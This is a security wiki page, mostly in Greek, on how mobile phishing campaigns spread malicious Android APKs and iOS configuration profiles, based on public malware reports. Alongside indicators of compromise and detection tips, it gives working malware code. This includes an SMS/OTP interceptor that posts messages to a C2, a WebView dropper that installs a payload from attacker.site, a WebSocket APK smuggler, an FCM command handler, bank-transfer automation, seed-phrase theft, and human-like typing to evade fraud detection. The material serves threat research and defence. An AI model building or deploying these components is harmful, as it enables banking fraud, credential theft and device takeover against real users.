# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Αυτή η σελίδα καλύπτει τεχνικές που χρησιμοποιούν οι δράστες απειλών για να διανείμουν **malicious Android APKs** και **iOS mobile-configuration profiles** μέσω phishing (SEO, social engineering, fake stores, dating apps, κ.ά.).
> Το υλικό προέρχεται από την εκστρατεία SarangTrap που αποκάλυψε η Zimperium zLabs (2025) και από άλλες δημόσιες έρευνες.

## Ροή Επίθεσης

1. **SEO/Phishing Infrastructure**
* Καταχωρήστε δεκάδες look-alike domains (dating, cloud share, car service…).
– Χρησιμοποιήστε λέξεις-κλειδιά στην τοπική γλώσσα και emojis στο στοιχείο `<title>` για να βελτιώσετε το ranking στο Google.
– Φιλοξενήστε *και* τις οδηγίες εγκατάστασης για Android (`.apk`) και iOS στην ίδια landing page.
2. **First Stage Download**
* Android: άμεσος σύνδεσμος σε ένα *unsigned* ή “third-party store” APK.
* iOS: `itms-services://` ή απλός HTTPS σύνδεσμος σε ένα κακόβουλο **mobileconfig** profile (βλέπε παρακάτω).
3. **Post-install Social Engineering**
* Κατά την πρώτη εκτέλεση η εφαρμογή ζητάει έναν **invitation / verification code** (ψευδαίσθηση αποκλειστικής πρόσβασης).
* Ο κωδικός αποστέλλεται με HTTP POST στο Command-and-Control (C2).
* Το C2 απαντά `{"success":true}` ➜ το malware συνεχίζει.
* Sandbox / AV dynamic analysis που δεν υποβάλλει ποτέ έγκυρο κωδικό δεν παρατηρεί **κακόβουλη συμπεριφορά** (αποφυγή ανίχνευσης).
4. **Runtime Permission Abuse** (Android)
* Επικίνδυνες άδειες ζητούνται μόνο **μετά από θετική απάντηση από το C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Νεότερες παραλλαγές **αφαιρούν το `<uses-permission>` για SMS από το `AndroidManifest.xml`** αλλά αφήνουν τη διαδρομή Java/Kotlin που διαβάζει SMS μέσω reflection ⇒ μειώνει το static score ενώ παραμένει λειτουργικό σε συσκευές που χορηγούν την άδεια μέσω κατάχρησης `AppOps` ή σε παλαιότερους στόχους.
5. **Facade UI & Background Collection**
* Η εφαρμογή εμφανίζει ακίνδυνες οθόνες (SMS viewer, gallery picker) υλοποιημένες τοπικά.
* Παράλληλα εξαποστέλλει:
- IMEI / IMSI, αριθμό τηλεφώνου
- Πλήρες dump `ContactsContract` (JSON array)
- JPEG/PNG από `/sdcard/DCIM` συμπιεσμένα με [Luban](https://github.com/Curzibn/Luban) για μείωση μεγέθους
- Προαιρετικό περιεχόμενο SMS (`content://sms`)
Τα payloads συμπιέζονται σε παρτίδες (batch-zipped) και αποστέλλονται μέσω `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Ένα μόνο **mobile-configuration profile** μπορεί να ζητήσει `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` κ.λπ. για να εγγράψει τη συσκευή σε “MDM”-like επιτήρηση.
* Οδηγίες social-engineering:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (screenshots on the phishing page).
3. Trust the unsigned profile ➜ ο επιτιθέμενος αποκτά τα entitlements *Contacts* & *Photo* χωρίς έλεγχο App Store.
7. **Network Layer**
* Απλό HTTP, συχνά στη θύρα 80 με HOST header όπως `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (χωρίς TLS → εύκολο να εντοπιστεί).

## Συμβουλές Red-Team

* **Dynamic Analysis Bypass** – Κατά την αξιολόγηση του malware, αυτοματοποιήστε το στάδιο του invitation code με Frida/Objection για να φτάσετε στο κακόβουλο branch.
* **Manifest vs. Runtime Diff** – Συγκρίνετε `aapt dump permissions` με runtime `PackageManager#getRequestedPermissions()`; η απουσία επικίνδυνων αδειών είναι κόκκινη σημαία.
* **Network Canary** – Διαμορφώστε `iptables -p tcp --dport 80 -j NFQUEUE` για να ανιχνεύσετε ασυνήθιστα bursts POST μετά την εισαγωγή κωδικού.
* **mobileconfig Inspection** – Χρησιμοποιήστε `security cms -D -i profile.mobileconfig` σε macOS για να εμφανίσετε το `PayloadContent` και να εντοπίσετε υπερβολικά entitlements.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: αυτόματο bypass κωδικού πρόσκλησης</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Δείκτες (Γενικά)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Δυναμική ανίχνευση endpoints μέσω shortlink
- Malware ανακτά μια λίστα σε plain-text, χωρισμένη με κόμματα, με ενεργά endpoints από ένα shortlink· απλοί μετασχηματισμοί συμβολοσειράς παράγουν το τελικό path της σελίδας phishing.

Παράδειγμα (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Ψευδοκώδικας:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Το βήμα “Make payment of ₹1 / UPI‑Lite” φορτώνει μια κακόβουλη φόρμα HTML από το δυναμικό endpoint μέσα σε ένα WebView και συλλέγει ευαίσθητα πεδία (τηλέφωνο, τράπεζα, UPI PIN) τα οποία γίνονται `POST` στο `addup.php`.

Ελάχιστος φορτωτής:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Ζητούνται επιθετικά δικαιώματα κατά την πρώτη εκτέλεση:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Οι επαφές τίθενται σε βρόχο για μαζική αποστολή smishing SMS από τη συσκευή του θύματος.
- Τα εισερχόμενα SMS αναχαιτίζονται από broadcast receiver και αποστέλλονται μαζί με μεταδεδομένα (sender, body, SIM slot, per-device random ID) στο `/addsm.php`.

Δείγμα Receiver:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) ως ανθεκτικό C2
- Το payload εγγράφεται στο Firebase Cloud Messaging (FCM); τα push messages φέρουν ένα πεδίο `_type` που χρησιμοποιείται ως διακόπτης για να προκαλέσει ενέργειες (π.χ., ενημέρωση προτύπων κειμένου phishing, εναλλαγή συμπεριφορών).

Παράδειγμα FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Σχέδιο handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Δείκτες/IOCs
- Το APK περιέχει secondary payload στο `assets/app.apk`
- Το WebView φορτώνει payment από `gate.htm` και exfiltrates σε `/addup.php`
- SMS exfiltration σε `/addsm.php`
- Ανάκτηση config μέσω shortlink (π.χ., `rebrand.ly/*`) που επιστρέφει CSV endpoints
- Εφαρμογές με ετικέτα generic “Update/Secure Update”
- FCM `data` μηνύματα με διακριτή `_type` σε untrusted apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Οι επιτιθέμενοι αντικαθιστούν όλο και περισσότερο στατικά APK links με ένα Socket.IO/WebSocket channel ενσωματωμένο σε Google Play–looking δολώματα. Αυτό αποκρύπτει το payload URL, παρακάμπτει URL/extension filters και διατηρεί ρεαλιστικό install UX.

Τυπική ροή client που παρατηρείται in the wild:

<details>
<summary>Socket.IO πλαστό Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Γιατί αποφεύγει απλούς ελέγχους:
- Δεν εκτίθεται στατικό APK URL· το payload ανασυντίθεται στη μνήμη από frames του WebSocket.
- Τα URL/MIME/extension φίλτρα που μπλοκάρουν απευθείας .apk απαντήσεις μπορεί να μην εντοπίσουν binary data που τούνελάρει μέσω WebSockets/Socket.IO.
- Οι crawlers και τα URL sandboxes που δεν εκτελούν WebSockets δεν θα ανακτήσουν το payload.

Δείτε επίσης WebSocket tradecraft και tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – Μελέτη περίπτωσης RatOn

Η εκστρατεία RatOn banker/RAT (ThreatFabric) αποτελεί ένα συγκεκριμένο παράδειγμα του πώς οι σύγχρονες mobile phishing operations συνδυάζουν WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, και ακόμη NFC-relay orchestration. Αυτή η ενότητα απομονώνει τις επαναχρησιμοποιήσιμες τεχνικές.

### Stage-1: WebView → native install bridge (dropper)
Οι επιτιθέμενοι παρουσιάζουν ένα WebView που δείχνει σε attacker page και ενσωματώνουν ένα JavaScript interface που εκθέτει έναν native installer. Ένα tap σε ένα HTML button καλεί native code που εγκαθιστά ένα second-stage APK bundled στα assets του dropper και στη συνέχεια το εκκινεί απευθείας.

Ελάχιστο μοτίβο:

<details>
<summary>Stage-1 dropper ελάχιστο μοτίβο (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML στη σελίδα:
```html
<button onclick="bridge.installApk()">Install</button>
```
Μετά την εγκατάσταση, ο dropper εκκινεί το payload μέσω explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: μη αξιόπιστες εφαρμογές που καλούν `addJavascriptInterface()` και εκθέτουν installer-like μεθόδους στο WebView; APK που περιλαμβάνει ενσωματωμένο secondary payload κάτω από `assets/` και καλεί το Package Installer Session API.

### Διαδικασία συναίνεσης: Accessibility + Device Admin + επακόλουθες runtime προτροπές
Το Stage-2 ανοίγει ένα WebView που φιλοξενεί μια σελίδα “Access”. Το κουμπί της καλεί μια exported μέθοδο που πλοηγεί το θύμα στις ρυθμίσεις Accessibility και ζητά την ενεργοποίηση της rogue υπηρεσίας. Μόλις παραχωρηθεί, το malware χρησιμοποιεί Accessibility για να κάνει αυτόματα κλικ μέσα από τις επόμενες runtime διαλόγους αδειών (contacts, overlay, manage system settings, κ.λπ.) και ζητά Device Admin.

- Το Accessibility προγραμματιστικά βοηθά στην αποδοχή μετέπειτα προτροπών εντοπίζοντας κουμπιά όπως “Allow”/“OK” στο node-tree και αποστέλλοντας κλικ.
- Έλεγχος/αίτημα άδειας Overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Δείτε επίσης:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Οι χειριστές μπορούν να εκδίδουν εντολές για:
- να εμφανίσουν μια πλήρους οθόνης επικάλυψη από ένα URL, ή
- να περάσουν inline HTML που φορτώνεται σε επικάλυψη WebView.

Πιθανές χρήσεις: coercion (εισαγωγή PIN), άνοιγμα wallet για υποκλοπή των PINs, μηνύματα λύτρων. Κρατήστε μια εντολή για να βεβαιώνεστε ότι η άδεια επικάλυψης έχει χορηγηθεί αν λείπει.

### Remote control model – text pseudo-screen + screen-cast
- Χαμηλό εύρος ζώνης: περιοδικά εξάγετε το Accessibility node tree, σειριοποιήστε τα εμφανιζόμενα κείμενα/ρόλους/όρια και στείλτε στο C2 ως ψευδο-οθόνη (εντολές όπως `txt_screen` μία φορά και `screen_live` συνεχώς).
- Υψηλή πιστότητα: ζητήστε MediaProjection και ξεκινήστε screen-casting/εγγραφή κατ' απαίτηση (εντολές όπως `display` / `record`).

### ATS playbook (bank app automation)
Δεδομένης μιας JSON εργασίας, ανοίξτε την εφαρμογή τράπεζας, οδηγήστε το UI μέσω Accessibility με ένα μείγμα ερωτημάτων κειμένου και taps σε συντεταγμένες, και εισάγετε το payment PIN του θύματος όταν ζητηθεί.

Παράδειγμα εργασίας:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Παραδείγματα κειμένων που εντοπίστηκαν σε μία ροή στόχου (CZ → EN):
- "Nová platba" → "Νέα πληρωμή"
- "Zadat platbu" → "Εισαγωγή πληρωμής"
- "Nový příjemce" → "Νέος παραλήπτης"
- "Domácí číslo účtu" → "Αριθμός εγχώριου λογαριασμού"
- "Další" → "Επόμενο"
- "Odeslat" → "Αποστολή"
- "Ano, pokračovat" → "Ναι, συνεχίστε"
- "Zaplatit" → "Πλήρωσε"
- "Hotovo" → "Ολοκληρώθηκε"

Οι χειριστές μπορούν επίσης να ελέγξουν/αυξήσουν τα όρια μεταφοράς μέσω εντολών όπως `check_limit` και `limit` που πλοηγούνται στο UI ορίων με παρόμοιο τρόπο.

### Εξαγωγή φράσης ανάκτησης πορτοφολιού κρυπτονομισμάτων
Στόχοι όπως MetaMask, Trust Wallet, Blockchain.com, Phantom. Ροή: ξεκλείδωμα (κλεμμένο PIN ή παρεχόμενο password), πλοήγηση σε Security/Recovery, αποκάλυψη/εμφάνιση της φράσης ανάκτησης, keylog/exfiltrate it. Εφαρμόστε locale-aware selectors (EN/RU/CZ/SK) για σταθεροποίηση της πλοήγησης σε διαφορετικές γλώσσες.

### Εξαναγκασμός Device Admin
Οι Device Admin APIs χρησιμοποιούνται για να αυξήσουν τις ευκαιρίες καταγραφής PIN και να δυσκολέψουν το θύμα:

- Άμεσο κλείδωμα:
```java
dpm.lockNow();
```
- Λήξη του τρέχοντος διαπιστευτηρίου για να αναγκαστεί αλλαγή (Accessibility καταγράφει νέο PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Εξαναγκάστε ξεκλείδωμα χωρίς βιομετρικά απενεργοποιώντας τις βιομετρικές δυνατότητες του keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Σημείωση: Πολλοί DevicePolicyManager controls απαιτούν Device Owner/Profile Owner σε πρόσφατο Android· κάποιες OEM builds ενδέχεται να είναι πιο χαλαρές. Πάντοτε επαληθεύστε στο στοχευόμενο OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 μπορεί να εγκαταστήσει και να εκτελέσει ένα εξωτερικό NFC-relay module (π.χ. NFSkate) και ακόμη να του παραδώσει ένα HTML template για να καθοδηγήσει το θύμα κατά τη διάρκεια του relay. Αυτό επιτρέπει contactless card-present cash-out παράλληλα με online ATS.

Ιστορικό: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Σετ εντολών χειριστή (παράδειγμα)
- UI/κατάσταση: `txt_screen`, `screen_live`, `display`, `record`
- Κοινωνικά: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Συσκευή: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Αντι-ανίχνευση ATS μέσω Accessibility: ανθρώπινος ρυθμός κειμένου και διπλή ένεση κειμένου (Herodotus)

Οι threat actors συνδυάζουν όλο και περισσότερο αυτοματοποίηση που αξιοποιεί Accessibility με αντι-ανίχνευση προσαρμοσμένη σε βασικά βιομετρικά συμπεριφοράς. Ένας πρόσφατος banker/RAT δείχνει δύο συμπληρωματικούς τρόπους παράδοσης κειμένου και έναν toggle για τον χειριστή ώστε να προσομοιώνει ανθρώπινη πληκτρολόγηση με τυχαίο ρυθμό.

- Λειτουργία ανίχνευσης: απαρίθμηση ορατών nodes με selectors και bounds για ακριβή στόχευση inputs (ID, text, contentDescription, hint, bounds) πριν από την ενέργεια.
- Διπλή ένεση κειμένου:
  - Mode 1 – `ACTION_SET_TEXT` απευθείας στον target node (σταθερό, χωρίς keyboard);
  - Mode 2 – clipboard set + `ACTION_PASTE` στο focused node (λειτουργεί όταν το direct setText είναι μπλοκαρισμένο).
- Ανθρώπινος ρυθμός: διαχωρίστε το string που δίνει ο χειριστής και παραδώστε το χαρακτήρα-προς-χαρακτήρα με τυχαίες καθυστερήσεις 300–3000 ms μεταξύ γεγονότων για να αποφύγετε heuristics «machine-speed typing». Υλοποιείται είτε προοδευτικά αυξάνοντας την τιμή μέσω `ACTION_SET_TEXT`, είτε επικολλώντας έναν χαρακτήρα κάθε φορά.

<details>
<summary>Σκίτσο Java: ανίχνευση node + καθυστέρηση εισόδου ανά χαρακτήρα μέσω setText ή clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Επικαλύψεις μπλοκαρίσματος για κάλυψη απάτης:
- Απεικονίστε μια πλήρους οθόνης `TYPE_ACCESSIBILITY_OVERLAY` με διαφάνεια που ελέγχεται από τον χειριστή· κρατήστε την αδιαφανή για το θύμα ενώ η απομακρυσμένη αυτοματοποίηση εκτελείται από κάτω.
- Συνήθως εκτεθειμένες εντολές: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Ελάχιστη επικάλυψη με ρυθμιζόμενο alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Συνηθισμένες λειτουργίες ελέγχου που συναντώνται: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (κοινή χρήση οθόνης).

## Αναφορές

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
